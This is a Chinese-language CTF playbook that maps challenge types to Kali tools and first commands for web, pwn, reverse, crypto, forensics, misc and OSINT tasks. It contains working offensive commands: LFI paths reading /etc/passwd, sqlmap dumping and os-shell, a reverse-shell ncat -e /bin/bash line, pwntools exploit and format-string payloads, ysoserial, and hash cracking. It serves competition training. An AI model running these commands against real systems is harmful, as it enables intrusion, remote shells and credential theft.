# CTF 解题手册(CTF Playbook)

> **何时读本文件**:参加 CTF 比赛(Jeopardy/Attack-Defense)或拿到 CTF 题目附件、远程地址,需要按题型(Web/Pwn/Reverse/Crypto/Forensics/Misc/OSINT)快速定位解题工具链与第一发命令时。

## 快速决策表

| 任务场景 | 首选工具 | 备选 | 关键区别 |
|---|---|---|---|
| 拿到任何未知附件 | file + strings + binwalk 三板斧 | exiftool、xxd | 三板斧 10 秒内定性文件;exiftool 补元数据,xxd 补十六进制层 |
| Web 黑盒站点侦察 | curl + whatweb | Burp Suite | curl 手工首包/自定义头;Burp 是全量代理改包 |
| 找隐藏路径/备份文件 | gobuster | feroxbuster、dirsearch、ffuf | feroxbuster 速度最快;gobuster 覆盖 dir/vhost/dns 三种模式 |
| 疑似 SQL 注入 | sqlmap -r(Burp 保存的请求) | Burp Repeater 手工 | sqlmap 自动跑库;手工构造绕 WAF/过滤 |
| ELF 二进制 + nc 服务 | checksec → gdb → pwntools | Ghidra 静态 | 先看保护决定打法,再动态调试,最后 pwntools 写 exp |
| 只给二进制找逻辑 | Ghidra | radare2、objdump | Ghidra 反编译伪 C 最快;r2 适合脚本化批处理 |
| .apk 逆向 | jadx | apktool | jadx 看 Java 源码;apktool 拿 smali 与资源文件 |
| .pyc 还原源码 | uncompyle6 | xxd 手工 | 仅支持 Python ≤ 3.8 |
| pcap 网络取证 | tshark | Wireshark GUI | 过滤器语法相同;批处理/导出对象用 tshark |
| 内存 dump 取证 | volatility3 | strings 粗筛 | volatility3 出进程/网络/文件;strings 兜底找 flag |
| 磁盘镜像取证 | sleuthkit(mmls/fls/icat) | testdisk/photorec | sleuthkit 按分区结构解析;photorec 按签名雕刻删除文件 |
| PNG/BMP 疑似隐写 | zsteg | stegsolve | zsteg 一条命令扫全通道 LSB;stegsolve 手动逐通道看 |
| JPG 疑似隐写 | steghide -p "" → stegseek | outguess | 空密码免费先试;有密码用 stegseek 秒跑 rockyou |
| 音频藏信息 | sonic-visualiser 频谱图 | ffmpeg 生成频谱图 | 频谱图里常直接写着 flag |
| 未知编码密文 | CyberChef Magic | quipqiup(古典密码) | Magic 自动猜测编码链;quipqiup 自动破古典替换密码 |
| RSA 题目(n,e,c) | RsaCtfTool | openssl + python 手搓 | RsaCtfTool 自动组合几十种攻击 |
| XOR 加密 | xortool | CyberChef XOR brute | xortool 自动猜密钥长度与密钥 |
| 未知哈希 | hashid → hashcat/john | crackstation(网页) | hashid 先给出 hashcat 模式号 |
| ZIP 加密 | zip2john + john | fcrackzip | 先排查"伪加密"(秒解),再爆破 |
| 已知服务找漏洞 | searchsploit | nmap -sV --script vuln | searchsploit 本地离线漏洞库 |
| 用户名/邮箱溯源 | sherlock / holehe | theHarvester | sherlock 查用户名注册平台;holehe 查邮箱 |
| 照片定位(OSINT) | exiftool | 反向图片搜索 | EXIF GPS 先看,再 Google Lens/Yandex 反搜 |

## CTF 环境准备

```bash
# 1. 更新源
sudo apt update

# 2. 方式一:按题型装 Kali 官方 metapackage(一次装齐一类)
sudo apt install -y kali-tools-web kali-tools-exploitation kali-tools-passwords \
                    kali-tools-forensics kali-tools-reverse kali-tools-crypto-stego \
                    kali-tools-information-gathering

# 3. 方式二:只补 CTF 高频单体工具
sudo apt install -y python3-pwntools gdb-pwndbg checksec hashid xortool rsactftool \
   steghide stegseek outguess stegsnow volatility3 sleuthkit binwalk foremost \
   feroxbuster ffuf dirsearch jwt-tool holehe ghidra radare2 jadx apktool upx-ucl \
   sqlmap hashcat john exploitdb seclists

# 4. 解压 rockyou 字典(密码/隐写爆破的事实标准)
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz

# 5. Ruby 生态工具
sudo gem install zsteg one_gadget seccomp-tools

# 6. Python 工具:Kali 已启用 PEP 668,CLI 工具用 pipx,库用 --break-system-packages 或 venv
pipx install git-dumper uncompyle6
pip install --break-system-packages pycryptodome sympy

# 7. 更新漏洞库
sudo searchsploit -u
```

**要点**:
- 调试器插件二选一:`gdb-pwndbg` 或 `gdb-gef`(分别以 `gdb-pwndbg`/`gdb-gef` 命令启动,也可作为默认 `gdb`)。
- 字典位置:`/usr/share/wordlists/rockyou.txt`(解压后)、`/usr/share/wordlists/dirb/common.txt`、`/usr/share/seclists/`。
- 打远程前先本地复现:附件二进制在本地调试通过后再 `remote()` 打靶机。
- 队伍共享:统一 libc/题解目录,exp 用 `pwn template` 生成的双模式骨架(本地 `process` / 远程 `REMOTE`)。

## 分题型解题流程

### Web

**识别特征**:题目给 http(s) 地址或 `ip:port`;附件是网站源码/备份压缩包;描述含"登录、后台、管理员、上传"。

**第一发命令**:
```bash
curl -i <url>                                   # 响应头:Server/X-Powered-By/自定义提示头
whatweb <url>                                   # 指纹
curl <url>/robots.txt                           # Disallow 路径常直接泄露入口
gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,txt,zip
```

**工具链顺序**:人工浏览 + 查看页面源码(Ctrl+U,注释藏 flag)→ robots/备份文件(index.php.bak、.swp、.DS_Store)→ 目录扫描 → Burp 代理抓全部交互 → 按漏洞类型专项:SQL 注入(sqlmap)、文件上传、文件包含、JWT、SSTI、反序列化、SSRF、XXE、源码泄露(.git)。

**深入套路**:
```bash
# .git 源码泄露(HEAD 返回 200 即泄露)
curl -s -o /dev/null -w "%{http_code}\n" <url>/.git/HEAD
git-dumper <url>/.git/ ./src

# SQL 注入:Burp 保存请求为 request.txt 后自动跑
sqlmap -r request.txt --batch --dbs

# LFI / PHP 伪协议
curl --path-as-is "<url>/index.php?page=../../../../etc/passwd"
curl "<url>/index.php?page=php://filter/convert.base64-encode/resource=config.php"

# SSTI 探测(回显 49 即 Jinja2 类模板)
curl -G --data-urlencode "name={{7*7}}" <url>/

# JWT 直接解码与弱密钥爆破
jwt-tool <token>
```

### Pwn

**识别特征**:附件为 ELF 二进制,题目给 `nc <ip> <port>`;描述含 "pwn、shell、getshell、overflow"。

**第一发命令**:
```bash
file chall                     # 架构、静态/动态链接、是否 stripped
checksec --file=chall          # 保护:RELRO / Canary / NX / PIE
nc <ip> <port>                 # 手动交互,看菜单与输入点
strings chall | grep -i flag
```

**工具链顺序**:checksec → Ghidra 读逻辑找危险函数(gets/scanf/read/strcpy/printf 格式串)→ 本地 gdb 跑通 → cyclic 定溢出偏移 → 构造 payload(ret2win → ret2libc → ROP → 格式化字符串)→ pwntools 打远程。

**深入套路**:
```bash
# 栈溢出偏移定位:本地崩溃后用 $rip 值查偏移
cyclic 200 | ./chall              # 崩溃信息里记下 rip/ebp 值
cyclic -l 0x61616168              # 输出十进制偏移

ROPgadget --binary chall --only "pop|ret" | grep "pop rdi"
one_gadget ./libc.so.6            # 拿到 libc 后找 execve("/bin/sh") gadget
pwn template <ip> <port> > exp.py # 生成双模式 exp 骨架;python3 exp.py REMOTE 打远程
```

**按保护选打法**:无 Canary → 栈溢出直打;NX 开 → ROP/ret2libc;PIE 开 → 先用 puts/printf 泄漏基址;Full RELRO → 不能改 GOT,改返回地址或 one_gadget。格式化字符串用 pwntools 的 `fmtstr_payload(<偏移>, {<地址>: <值>})`。

**跨架构(ARM/MIPS)**:
```bash
qemu-aarch64 -L /usr/aarch64-linux-gnu ./chall
```

**libc 版本修复**:题目自带 libc 时,`patchelf --set-interpreter <ld路径> --replace-needed libc.so.6 <libc路径> ./chall`。

### Reverse

**识别特征**:只给二进制(ELF/PE)/apk/pyc/加密器,要求输入正确 key/serial,或从校验逻辑还原算法;输入本地即判,无远程服务。

**第一发命令**:
```bash
file crackme
strings -n 6 crackme | grep -iE "flag|key|pass|correct|wrong"
```

**工具链顺序**:file/strings → Ghidra 反编译读 main/校验函数 → 字符串与函数交叉引用定位 → 静态推不出再动态(gdb/ltrace/strace)→ 特殊格式走专项工具(apk/pyc/加壳)。

**Ghidra 标准流程**:新建 Non-Shared 工程 → 拖入二进制 → 双击进 CodeBrowser → `Search > For Strings` 双击可疑字符串 → Decompiler 窗口看伪 C → 右键重命名变量/修改类型 → 对照 main 还原算法。

**深入套路**:
```bash
objdump -d -M intel crackme > disasm.txt   # 精读指令时导出 Intel 语法反汇编
ltrace ./crackme                           # 跟库函数调用:strcmp 比对点一目了然
strace ./crackme                           # 跟系统调用:文件读写/网络行为
r2 -q -c "aaa; iz; afl" crackme            # 命令行快速扫字符串与函数列表
upx -d crackme_upx                         # UPX 壳一键脱壳
```

**专项格式**:`.apk` → jadx(Java 源码)+ apktool(smali/资源);`.pyc` → uncompyle6(Python ≤ 3.8);Windows 程序注意 `strings -e l`(UTF-16LE)。

### Crypto

**识别特征**:给密文(n、e、c / pem 文件 / 异或输出 / 古典密文 / 哈希)或加密脚本 `.py`,或 nc 加密服务。

**第一发命令**:
```bash
file <file>; cat <file>                             # 先看清给了什么格式
openssl rsa -pubin -in key.pub -text -noout | head  # RSA:读出 n、e
hashid '<hash>'                                     # 疑似哈希:识别类型与模式号
```

**工具链顺序**:有源码先读源码找弱点 → 无源码按"编码 → 古典 → 现代"排查:CyberChef Magic 自动解编码链 → 古典密码 quipqiup → XOR 用 xortool → RSA 用 RsaCtfTool/factordb 查 n 分解 → 哈希用 rockyou 跑 → 都不行则用 pycryptodome 写脚本复现算法。

**深入套路**:
```bash
RsaCtfTool --publickey key.pub --uncipherfile cipher.bin --private   # 自动组合攻击
xortool -c 20 cipher.bin                 # XOR:假设明文为英文文本(空格=0x20 最常见)

# p、q 已知时手搓 RSA 解密(最短可用形态)
python3 -c "n=<n>;e=65537;c=<c>;p=<p>;q=<q>;d=pow(e,-1,(p-1)*(q-1));print(pow(c,d,n).to_bytes((n.bit_length()+7)//8,'big'))"
```

**常见弱点清单**:小 e(立方根攻击)、共模攻击(同 n 不同 e)、e 与 phi 不互素、n 在 factordb.com 已被分解、p/q 相邻(Fermat 分解)、e 很大(Wiener 攻击)。

**数学型密码题进阶**(pip 安装,不在 Kali 默认工具表):现代 Crypto 题(Coppersmith 小根、LLL 格、格攻击)用 SageMath(`sudo apt install sagemath` 或 https://sagecell.sagemath.org 在线跑);符号执行/约束求解用 `pipx install z3-solver`(Python API `from z3 import *`)配合 angr(`pipx install angr`)做 Rev/Pwn 的自动化路径探索;Java 反序列化直接用 ysoserial(GitHub 下载 jar:`java -jar ysoserial.jar CommonsCollections6 '<cmd>' > payload.bin`,配合 03-web-testing.md 的 phpggc 用于 PHP 靶机)。

### Forensics

**识别特征**:附件为 pcap/pcapng、内存 dump(raw/img/vmem)、磁盘镜像(dd/E01)、日志文件。

**第一发命令**:
```bash
file <file>
strings -n 8 <file> | grep -iE "flag|ctf\{" | head
binwalk <file>                       # 检查有无嵌入对象
capinfos <file>.pcap                 # pcap 概况:包数、时间范围
```

**工具链顺序**:pcap → tshark 按协议过滤(http/ftp/usb/dns)→ 导出 HTTP 对象 → follow TCP 流;内存 → volatility3(pslist/cmdline/filescan → dumpfiles);磁盘 → mmls 看分区 → fls 列文件 → icat 恢复;兜底用 foremost/bulk_extractor 签名雕刻。

**深入套路**:
```bash
tshark -r <file>.pcap -Y "http.request" -T fields -e http.host -e http.request.uri | sort -u
tshark -r <file>.pcap --export-objects http,http_out      # 拖回所有 HTTP 传输文件
tshark -r <file>.pcap -Y "dns" -T fields -e dns.qry_name  # DNS 隧道/外带数据
tshark -r <file>.pcap -Y "usb.capdata || usbhid.data" -T fields -e usb.capdata -e usbhid.data  # USB 键盘流量
volatility3 -f <dump> windows.cmdline | grep -iE "cmd|ps1|flag"
```

**高频考点**:明文协议凭据(ftp/telnet/http POST)、USB 键盘流量(按 HID 映射还原按键)、图片传输(export objects)、被删文件(磁盘未分配空间/回收站)、内存中的密码与进程注入(malfind)。

### Misc

**识别特征**:图片/音频/压缩包/零散文件/题面彩蛋;不属于其他任何类别。

**第一发命令(三板斧)**:
```bash
file misc.bin
strings -n 6 misc.bin | grep -iE "flag|pass|ctf"
binwalk -e misc.bin          # 自动提取嵌入对象(2.x 输出到 _misc.bin.extracted/,3.x 到 extractions/)
exiftool image.jpg
```

**隐写常见藏匿点排查表(重点)**:

| 载体 | 常见藏匿点 | 检查命令 |
|---|---|---|
| PNG/BMP | LSB 位平面 / 宽高被改(藏下半截) | `zsteg -a <file>.png`、`pngcheck -v <file>.png`(CRC 报错 = 宽高可疑) |
| JPG | steghide 数据 / EXIF / 文件尾拼接 | `steghide extract -sf <file>.jpg -p ""`、`exiftool`、`binwalk` |
| WAV/MP3 | 频谱图 / LSB(steghide 支持 WAV) / 摩尔斯电码 | `sonic-visualiser <file>.wav` 看频谱 |
| GIF/视频 | 分离帧后逐帧看 | `ffmpeg -i in.gif frame_%03d.png` |
| ZIP | 伪加密(加密标志位) / CRC 爆破 / 嵌套压缩 | `zipinfo <file>.zip`、`fcrackzip -u -D -p <wordlist> <file>.zip` |
| 文本 | 零宽字符 / 行尾空白隐写 | `xxd <file>.txt`、`stegsnow -p <password> <in>.txt <out>.txt` |
| PDF | 注释 / 内嵌 JS / 对象流 | `pdftotext <file>.pdf -`、`strings <file>.pdf` |
| 任意文件 | 文件结构结束后附加数据 | `binwalk <file>`、对比同类型正常文件大小 |

### OSINT

**识别特征**:给照片/用户名/邮箱/域名/公司,要求定位人物、地点、时间、组织关系;几乎没有"附件"或只有媒体文件。

**第一发命令**:
```bash
exiftool <photo>                    # EXIF:GPS、时间、设备型号
theHarvester -d <domain> -b all     # 邮箱/子域/IP 一把抓
sherlock <username>                 # 用户名在哪些平台注册
```

**工具链顺序**:图片先 EXIF 再反向图片搜索(Google Lens / Yandex / TinEye,浏览器操作)→ 域名 whois/dig/DNS 记录 → 社媒平台枚举 → Google dorks 定向检索 → 汇总交叉验证。

**深入套路**:
```bash
whois <domain>
dig <domain> any +short
holehe <email>                      # 验证邮箱注册了哪些网站
```

**Google dorks 常用式**:`site:<domain> filetype:pdf`、`intitle:"index of" backup`、`"<邮箱>" -site:<domain>`。

## 核心工具详解

### file — 万物第一发:文件真实类型识别

**用途**:读取魔数判定文件真实类型,输出架构、链接方式、是否 stripped 等关键信息。
**安装**:Kali 默认已装(fileutils 基础组件)。
**使用场景**:拿到任何附件的第一条命令;扩展名伪装是 Misc/Web 题常见开局。

```bash
file <file>            # 单个文件
file *                 # 整个目录快速定性
file chall             # "ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped" 直接决定 pwn 思路
```

**实战要点**:
- 输出里的 "statically linked" 决定能否直接 ROP 打 syscall;"stripped" 说明要去 Ghidra 自动找 main。
- 扩展名与真实类型不符(如 `png` 实际是 ZIP)→ 改后缀或按真实类型处理。
- 识别为 "data" 的文件 → 转向 xxd/binwalk/十六进制人工分析。

### strings — 三板斧之二:可打印字符串提取

**用途**:从任意二进制提取可打印字符串,快速找 flag、提示语、URL、函数名。
**安装**:Kali 默认已装(binutils)。
**使用场景**:Reverse/Pwn/Misc/Forensics 全类型通用;配合 grep 做 10 秒级初筛。

```bash
strings -n 6 <file>                                  # 至少 6 字符,过滤噪声
strings <file> | grep -iE "flag|ctf|key|pass|secret" # 关键词定向
strings -td <file> | grep -i flag                    # 输出十进制偏移,便于回文件定位
strings -e l <file>                                  # UTF-16LE,Windows 程序必用
```

**实战要点**:
- Windows 程序字符串默认 UTF-16,普通 strings 看不到,必须 `-e l`。
- `-td` 的偏移可直接在 Ghidra/xxd 中定位同一字符串。
- strings 找不到不代表没有:LSB 隐写、加密数据、宽字符都要换工具。

### binwalk — 三板斧之三:嵌入文件签名扫描与提取

**用途**:按魔数签名扫描文件内嵌入的文件系统/压缩流/图片,并可自动提取;附带熵分析。
**安装**:Kali 默认已装(binwalk)。
**使用场景**:Misc/Forensics 题首选;固件分析、多层嵌套压缩、"文件套文件"套路。

```bash
binwalk <file>            # 签名扫描(默认)
binwalk -e <file>         # 自动提取
binwalk -Me <file>        # 递归提取(嵌套时用;输出目录 2.x 为 _<file>.extracted/,3.x 为 extractions/)
binwalk -E <file>         # 熵分析:高熵段 = 加密/压缩数据
```

**实战要点**:
- 提取出的目录里继续 `file *` + `strings`,嵌套路常见 zip 里还有 zip。
- 熵分析平坦高熵 → 可能加密,先找密钥;局部尖峰 → 签名位置。
- 图片显示正常但 binwalk 有签名 → 文件尾拼接了数据,直接 `binwalk -e` 或 foremost。

### xxd — 十六进制层人工检查

**用途**:十六进制转储、按偏移查看、hex 与二进制互转。
**安装**:Kali 默认已装(vim-common)。
**使用场景**:需要看魔数、文件头结构、指定偏移内容,或把 hex 字符串还原成文件的场景。

```bash
xxd <file> | head -40              # 开头(文件头/魔数)
xxd -s <offset> -l <len> <file>    # 从偏移看指定长度
echo 666c6167 | xxd -r -p          # hex 转字符串
xxd -r -p <hex.txt> > <out>.bin    # hex 文本还原为二进制文件
```

**实战要点**:
- PNG 宽高在偏移 0x10(IHDR),CRC 报错时在此改高宽可"展开"被藏的下半图。
- ZIP 伪加密:文件头加密标志位(xxxFlagBits)在 hex 中改回 0 即可解开。
- 与 `binwalk` 互补:binwalk 自动签名,xxd 人工精修。

### exiftool — 文件元数据读取/写入

**用途**:读写图片/音视频/PDF 的全部元数据(EXIF、GPS、注释、作者、历史)。
**安装**:Kali 默认已装(libimage-exiftool-perl)。
**使用场景**:Misc 题标配第一发;OSINT 照片定位;隐写信息常直接藏在 Comment/Artist 字段。

```bash
exiftool <file>                              # 全部元数据
exiftool -a -u -g1 <file>                    # 含未知标签、按组分类显示
exiftool -b -ThumbnailImage <file>.jpg > thumb.jpg   # 提取内嵌缩略图(常与正图不同)
```

**实战要点**:
- `Comment`、`Artist`、`Image Description` 字段是隐写高频藏匿点。
- 缩略图与显示图不一致是经典套路:`-b -ThumbnailImage` 提出来单独看。
- OSINT 题先看 GPS:Latitude/Longitude 直接转换即坐标。

### checksec — 二进制保护机制检查

**用途**:一行输出 RELRO/Canary/NX/PIE 四项保护,直接决定 pwn 打法。
**安装**:`sudo apt install checksec`(pwntools 也内置:`pwn checksec`)。
**使用场景**:pwn 题第二步(file 之后),选攻击路线前的必查项。

```bash
checksec --file=<file>     # 独立 checksec 脚本语法
pwn checksec <file>        # pwntools 版(随 python3-pwntools 安装)
```

**实战要点**:
- Full RELRO → GOT 不可写,放弃 GOT 改写,走 ret2libc/one_gadget。
- NX disabled → 直接栈上 shellcode;NX enabled → ROP 链。
- PIE enabled → 所有地址带随机基址,需先泄漏(puts 泄漏 GOT 反推 libc、泄漏返回地址反推程序基址)。

### gdb — 动态调试器(pwndbg/gef 增强)

**用途**:断点、单步、寄存器与内存检查;pwn 题验证溢出偏移与泄漏的核心。
**安装**:`sudo apt install gdb gdb-pwndbg`(或 `gdb-gef`,二选一)。
**使用场景**:静态分析推不出结论、需要观察运行时状态、验证 payload 崩溃点时。

```bash
gdb -q ./chall            # 启动(pwndbg 版可显式用 gdb-pwndbg -q ./chall)
# 常用会话命令:
#   b main            设置断点(或 b *0x401234)
#   run               运行;r 重跑
#   ni / si           单步(不进入/进入函数)
#   x/20gx $rsp       按地址查看栈
#   x/s $rdi          把寄存器当字符串指针查看
#   info functions    函数列表(未 strip 时)
#   vmmap             (pwndbg/gef)段权限,找可写/可执行区域
```

**实战要点**:
- 崩溃后先 `info registers` 看 rip/ebp 是否被 cyclic pattern 覆盖,再 `cyclic -l <值>` 定偏移。
- 远程题先在本地同版本环境调通;libc 不同会导致 gadget 偏移全错(patchelf 换 libc)。
- pwndbg/gef 都内置 `checksec` 与 `vmmap`,会话内直接敲。

### pwntools — Python exploit 框架(pwn/cyclic/ELF/remote)

**用途**:CTF pwn 事实标准库:exp 模板生成、pattern、打包、远程交互、ELF 解析、格式化字符串 payload。
**安装**:`sudo apt install python3-pwntools`(Kali 默认已装)。
**使用场景**:所有 pwn 题;生成 exp 骨架后本地 process / 远程 remote 一键切换。

```bash
pwn template <ip> <port> > exp.py     # 生成本地/远程双模式骨架
cyclic 200                            # 生成 De Bruijn pattern
cyclic -l 0x61616168                  # 由覆盖值反查偏移
```

```python
from pwn import *
context.arch = 'amd64'                # 或 context.binary = ELF('./chall') 自动设
elf = ELF('./chall')
io = remote('<ip>', <port>)           # 本地调试换 process('./chall')
io.sendlineafter(b'>> ', flat({72: elf.sym['win']}))   # 偏移 72 覆盖返回地址
io.interactive()
```

**实战要点**:
- `python3 exp.py REMOTE` 打远程,不带参数默认本地(模板自带参数解析)。
- `flat()` 自动按 context.arch 打包整数;`p64()/p32()` 手工打包。
- 格式化字符串:`fmtstr_payload(6, {elf.got['printf']: elf.sym['system']})`,6 为参数偏移。
- 泄漏用 `u64(io.recvline().strip().ljust(8, b'\0'))` 补齐再解包。

### ROPgadget — ROP 链 gadget 搜索

**用途**:在二进制中搜索以 ret 结尾的指令片段,构造 ROP 链。
**安装**:`sudo apt install python3-ropgadget`(Kali 默认已装,命令 ROPgadget)。
**使用场景**:NX 开启后绕过栈不可执行;ret2libc 需要 pop rdi; ret 传参。

```bash
ROPgadget --binary <file> | grep ": pop rdi ; ret"
ROPgadget --binary <file> --only "pop|ret"       # 只保留 pop/ret 类 gadget
ROPgadget --binary <file> --ropchain             # 静态链接时自动生成 syscall 链
```

**实战要点**:
- amd64 传参顺序 rdi → rsi → rdx,先找 `pop rdi; ret` 再 `pop rsi; r15; ret`。
- ret2libc 标准链:`pop rdi; ret` + `/bin/sh` 地址 + system 地址(PIE 关时)。
- 动态链接二进制 gadget 少,优先去 libc 里找(配合泄漏的 libc 基址)。

### nc / ncat — 网络连接与监听

**用途**:连接题目远程服务、建立监听接收反弹 shell、手工探测端口协议。
**安装**:Kali 默认已装(netcat-openbsd + nmap 的 ncat)。
**使用场景**:pwn/网络类题第一发交互;所有反弹 shell 的接收端。

```bash
nc <ip> <port>            # 连接题目服务,手动玩一遍
nc -lvnp 9001             # 本地监听,接收反弹 shell
rlwrap nc <ip> <port>     # 加行编辑与历史(交互菜单题体验大幅提升)
ncat --ssl <ip> <port>    # 需要 TLS 的服务
```

**实战要点**:
- 反弹 shell 后 `python3 -c "import pty;pty.spawn('/bin/bash')"` 升级交互,再 `export TERM=xterm`。
- openbsd 版 nc 无 `-e`,需要执行命令时用 `ncat -e /bin/bash <ip> <port>`。
- 手工 nc 连服务观察 banner/菜单,常直接发现格式化字符串/溢出输入点。

### Ghidra — NSA 开源反编译器(逆向首选 GUI)

**用途**:自动分析 + 伪 C 反编译,看懂程序逻辑的主力;支持 x86/ARM/MIPS 等多架构。
**安装**:`sudo apt install ghidra`。
**使用场景**:Reverse/Pwn 题需要"读懂逻辑"而不只是抠字符串;大型二进制一步到位。

```bash
ghidra    # 启动 GUI;新建 Non-Shared 工程后拖入二进制,双击进 CodeBrowser
# GUI 内高频操作:
#   Search > For Strings      字符串搜索,双击定位交叉引用
#   窗口 Functions/Symbols    找 main/win/backdoor(未 strip 时函数名即线索)
#   Decompiler 窗口           伪 C 阅读;右键变量可重命名/Retype(把 int 改 char* 立刻可读)

# 无界面批量分析(analyzeHeadless 位于 Ghidra 安装目录 support/ 下)
<path-to-ghidra>/support/analyzeHeadless <proj_dir> <proj_name> -import <file>
```

**实战要点**:
- 先搜字符串(flag/key/correct),双击后在 Decompiler 看谁引用它,校验函数往往就在旁边。
- `main` 不一定是入口,看 entry/`__libc_start_main` 的第一个参数。
- Pwn 题用它找 `win`/`backdoor` 函数地址(ret2win 套路)。

### radare2 — 命令行逆向框架

**用途**:命令行反汇编/反编译/patch,适合脚本化批量分析与无 GUI 环境。
**安装**:Kali 默认已装(radare2)。
**使用场景**:Ghidra 太重、只需快速看某函数/字符串/导入表;SSH 环境下逆向。

```bash
r2 -A <file>                    # 打开并自动分析
r2 -q -c "aaa; iz; afl" <file>  # 一行式:分析+字符串+函数列表后退出
# 会话内常用:
#   s main; pdf    跳到 main 并打印反汇编
#   iz             数据段字符串
#   ii             导入表(认危险函数:gets/system/strcpy)
#   V              可视模式
```

**实战要点**:
- `-A` 对大文件慢,可省略后手动 `aaa`。
- patch 改指令用 `wa` 写汇编(破解注册校验类题),改完 `w` 保存。
- 与 Ghidra 互补:r2 快速定位,Ghidra 精读逻辑。

### objdump — 反汇编与段查看

**用途**:GNU 工具链反汇编,Intel 语法导出、按地址范围截取、段内容 hex 转储。
**安装**:Kali 默认已装(binutils)。
**使用场景**:需要精读某段指令、离线 grep 反汇编全文、对比 patch 前后字节。

```bash
objdump -d -M intel <file> > disasm.txt        # 全量 Intel 语法导出
objdump -d --start-address=0x401200 --stop-address=0x4012ff <file>   # 按地址截取
objdump -t <file> | grep -i flag               # 符号表过滤
objdump -s -j .rodata <file>                   # .rodata 段 hex 转储
```

**实战要点**:
- 导出的 disasm.txt 可直接 grep 指令序列(如所有 `call` 目标)。
- 与 gdb 配合:gdb 看动态,导出全文静态比对。
- `-M intel` 后汇编风格与 pwntools payload 计算习惯一致。

### curl — Web 手工侦察与利用第一发

**用途**:构造任意 HTTP 请求:自定义头/方法/数据/编码,批量探测状态码。
**安装**:Kali 默认已装(curl)。
**使用场景**:Web 题替代浏览器做精细控制;验证注入/包含/伪造头套路。

```bash
curl -i <url>                                    # 响应头:Server/X-Powered-By/提示头
curl -X POST -d "user=admin&pass=admin" <url>    # 表单提交
curl -H "X-Forwarded-For: 127.0.0.1" <url>       # 伪造头套路(绕"仅内网"限制)
curl --path-as-is "<url>/....//etc/passwd"       # 目录穿越不转义 ../
for p in robots.txt .git/ admin/ backup.zip; do curl -s -o /dev/null -w "%{http_code} $p\n" <url>/$p; done
```

**实战要点**:
- 常见绕过头:`X-Forwarded-For`、`X-Real-IP`、`Referer`、`User-Agent`(题目描述常暗示)。
- 保存 Burp 风格完整请求直接喂 `sqlmap -r request.txt`。
- `-s -o /dev/null -w "%{http_code}"` 批量探测比目录扫描器更可控。

### sqlmap — 自动化 SQL 注入

**用途**:自动检测与利用 SQL 注入:枚举库表、脱库、读写文件、尝试 os-shell。
**安装**:Kali 默认已装(sqlmap)。
**使用场景**:确认或疑似注入点后的自动化;有 Burp 完整请求时效率最高。

```bash
sqlmap -u "<url>/item.php?id=1" -p id --batch --dbs                    # GET 参数
sqlmap -r request.txt -p username --batch --dbs                        # Burp 保存的完整请求(带 Cookie/POST)
sqlmap -r request.txt --batch -D <db> -T <table> --dump                # 脱表
sqlmap -r request.txt --batch --os-shell                               # 尝试拿 shell
sqlmap -u "<url>/item.php?id=1" --tamper=space2comment --batch         # 过滤绕过
```

**实战要点**:
- `--batch` 全自动默认回答,脚本化必加。
- 优先用 `-r`(带完整 Cookie 与头),成功率远高于裸 `-u`。
- WAF/黑名单场景换 `--tamper`;空格被过滤先试 `space2comment`。
- 脱库慢时先 `--dbs` → `-D xx --tables` → 精确 `-T xx --dump`。

### gobuster — 目录/子域名爆破

**用途**:多线程爆破 Web 目录、vhost、DNS 子域。
**安装**:Kali 默认已装(gobuster)。
**使用场景**:找后台、备份、上传点、隐藏接口的第一手段。

```bash
gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,zip
gobuster dir -u <url> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50
gobuster vhost -u <url> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/namelist.txt
```

**实战要点**:
- 先小字典(common.txt)快速跑,再换大字典精扫。
- 结果要看 302/403:403 的路径常是"存在但没权限",配合头伪造再访问。
- `-x` 扩展名字典对找 .bak/.zip 备份文件命中率高。

### Burp Suite — Web 万能代理平台

**用途**:拦截/重放/修改全部 HTTP 流量,Repeater 手工测试、Intruder 爆破、Decoder 解码。
**安装**:Kali 默认已装(burpsuite)。
**使用场景**:任何需要"看见并修改请求"的 Web 题;登录爆破、越权测试、上传绕过。

```bash
burpsuite    # 启动;浏览器代理指向 127.0.0.1:8080,证书访问 http://burp 安装
```

**实战要点**:
- 先装 CA 证书,否则 HTTPS 站点抓不到。
- 90% 工作在 Repeater:改一个参数重放一次,比浏览器快十倍。
- 想自动化的请求右键 Save item 存为 txt,直接给 `sqlmap -r`。
- Community 版 Intruder 限速,大批量爆破换 ffuf/hydra。

### hashid — 哈希格式识别

**用途**:识别哈希类型,并给出对应 hashcat 模式号与 john 格式名。
**安装**:`sudo apt install hashid`。
**使用场景**:拿到一串疑似哈希的密文,决定用哪个模式爆破之前。

```bash
hashid '<hash>'
hashid -m -j '<hash>'    # 同时输出 hashcat 模式号与 john 格式
```

**实战要点**:
- MD5(32 hex)、SHA1(40)、SHA256(64)、NTLM(32)长度即可初判,带 `$6$`/`$2y$` 前缀的看前缀。
- 同长度多候选时,结合题目上下文(Windows→NTLM、Linux shadow→sha512crypt)取舍。
- 结果直接接 `hashcat -m <模式号>` 或 `john --format=<格式>`。

### hashcat — GPU 密码哈希爆破

**用途**:高速字典+规则爆破上百种哈希格式。
**安装**:Kali 默认已装(hashcat)。
**使用场景**:已知哈希类型、有字典时的批量爆破。

```bash
hashcat -m 0 <hashes.txt> /usr/share/wordlists/rockyou.txt                       # MD5
hashcat -m 1000 <hashes.txt> /usr/share/wordlists/rockyou.txt                    # NTLM
hashcat -m 1800 <hashes.txt> /usr/share/wordlists/rockyou.txt                    # Linux sha512crypt($6$)
hashcat -m 3200 <hashes.txt> /usr/share/wordlists/rockyou.txt                    # bcrypt
hashcat -m 0 -r /usr/share/hashcat/rules/best64.rule <hashes.txt> /usr/share/wordlists/rockyou.txt
hashcat --show -m 0 <hashes.txt>                                                 # 只看已破出的结果
```

**实战要点**:
- 虚拟机无独显时装 `pocl-opencl-icd` 走 CPU,或直接换 john。
- 常用模式号:0=MD5、1000=NTLM、1800=sha512crypt、3200=bcrypt、22000=WPA。
- rockyou 跑不动就加规则(best64/rockyou-30000),成本低收益高。

### john — 多格式密码爆破(含 zip2john 等)

**用途**:CPU 爆破 + 各类文件哈希提取器(zip2john/rar2john/ssh2john/unshadow)。
**安装**:Kali 默认已装(john)。
